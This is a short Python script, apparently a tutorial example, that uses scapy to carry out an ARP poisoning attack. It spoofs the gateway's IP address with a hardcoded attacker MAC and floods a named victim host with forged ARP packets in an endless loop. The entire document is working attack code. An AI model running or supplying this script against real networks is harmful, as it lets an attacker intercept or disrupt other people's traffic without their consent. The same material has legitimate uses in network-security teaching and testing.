#!/usr/bin/python
 
# Python arp poison example script
# Written by aviran
# visit for more details aviran.org
 
from scapy.all import *
mac_aku = "24:0A:64:1B:BA:91"
ip_gateway = "172.20.10.1"
ip_korban = "172.20.10.2"

packet = Ether()/ARP(op="who-has",hwsrc=mac_aku,psrc=ip_gateway,pdst=ip_korban)

while 1: 
    sendp(packet)
